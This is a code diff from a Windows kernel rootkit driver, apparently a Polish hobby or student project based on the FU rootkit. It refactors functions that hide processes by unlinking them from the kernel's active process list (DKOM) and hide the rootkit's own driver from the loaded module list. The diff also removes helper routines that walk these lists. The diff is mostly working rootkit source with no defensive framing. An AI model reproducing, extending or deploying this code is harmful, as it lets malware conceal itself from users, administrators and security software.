@@ -7,7 +7,7 @@
 extern PMODULE_ENTRY	g_ModuleListBegin;
 extern NTOSKRNL_OFFSETS offsets;
 
-BOOLEAN OnProcessHide(IN ULONG pid) 
+BOOLEAN DKOM_OnProcessHide(IN ULONG pid) 
 {
 	PEPROCESS eproc = 0;
 	KIRQL tmpIrql;
@@ -16,7 +16,7 @@ BOOLEAN OnProcessHide(IN ULONG pid)
 
 	tmpIrql = RaiseIRQLevel();
 
-	eproc = (PEPROCESS)FindProcessEPROCByPid( pid );
+    PsLookupProcessByProcessId( (HANDLE)pid, &eproc );
 
 	if (eproc == NULL ) {
 		DbgPrint("rootkit: Nie moge znalezc bloku EPROCESS\n");	 
@@ -32,77 +32,6 @@ BOOLEAN OnProcessHide(IN ULONG pid)
 	return TRUE;
 }
 
-
-ULONG FindProcessEPROCByPid(int terminate_PID)
-{
-	ULONG eproc       = 0x00000000; 
-	int   current_PID = 0;
-	int   start_PID   = 0; 
-	int   i_count     = 0;
-	PLIST_ENTRY plist_active_procs;
-
-	if (terminate_PID == 0)
-		return terminate_PID;
-
-	eproc = (ULONG) PsGetCurrentProcess();
-	start_PID = *((ULONG*)(eproc+offsets.processPid));
-	current_PID = start_PID;
-
-	while(1)
-	{
-		if(terminate_PID == current_PID)
-			return eproc;
-		else if((i_count >= 1) && (start_PID == current_PID))
-		{
-			return 0x00000000;
-		}
-		else {
-			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
-			eproc = (ULONG) plist_active_procs->Flink;
-			eproc = eproc - offsets.activeProcessListOffset;
-			current_PID = *((int *)(eproc+offsets.processPid));
-			i_count++;
-		}
-	}
-}
-
-ULONG FindProcessEPROCByName(char procName[])
-{
-	ULONG eproc       = 0x00000000; 
-	int	i_count     = 0;
-	char *startName = 0;
-	char *currentName = 0;
-	PLIST_ENTRY plist_active_procs;
-
-	if (procName == 0)
-		return 0;
-
-	_asm int 3
-
-	eproc = (ULONG)PsGetCurrentProcess();
-	startName = (PCHAR)(eproc+offsets.processName);
-	currentName = startName;
-
-	while(1)
-	{
-
-		if (!strncmp( procName, currentName, strlen(procName) ) ) 
-			return eproc;
-		else 
-		if((i_count >= 1) && (startName == currentName))
-		{
-			return 0x00000000;
-		}
-		else {
-			plist_active_procs = (LIST_ENTRY *) (eproc+offsets.activeProcessListOffset);
-			eproc = (ULONG) plist_active_procs->Flink;
-			eproc = eproc - offsets.activeProcessListOffset;
-			currentName = (PCHAR)(eproc+offsets.processName);
-			i_count++;
-		}
-	}
-}
-
 // kod bazuje na FU rootkit
 VOID DKOM_HideProcess( PEPROCESS eproces )
 {
@@ -116,7 +45,7 @@ VOID DKOM_HideProcess( PEPROCESS eproces )
 	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
 }
 
-BOOLEAN HideRootkitModule() 
+BOOLEAN DKOM_HideRootkitModule() 
 {
 	UNICODE_STRING rootkitdriver;
 	PMODULE_ENTRY pHelper;	
@@ -150,7 +79,7 @@ BOOLEAN HideRootkitModule()
     return FALSE;
 }
 
-ULONG GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
+ULONG DKOM_GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
 {
 	PMODULE_ENTRY pHelper;
 
@@ -159,21 +88,4 @@ ULONG GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
 		return 0;
 	
 	return (ULONG) pHelper;
-}
-
-PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName)
-{
-	PMODULE_ENTRY pMeCurrent = pPsLoadedModuleList;
-
-	while ( (PMODULE_ENTRY)(pMeCurrent->le_mod.Flink) != pPsLoadedModuleList) {
-		if ( (pMeCurrent->unk1 !=0x00000000) && pMeCurrent->driver_Path.Length!= 0) {
-			if (RtlCompareUnicodeString(usModuleName, &(pMeCurrent->driver_Name),FALSE)== 0) {
-				//znaleziono modul
-				return pMeCurrent;
-			}
-		}
-		pMeCurrent = (PMODULE_ENTRY)pMeCurrent->le_mod.Flink;
-	}
-
-	return NULL;
 }
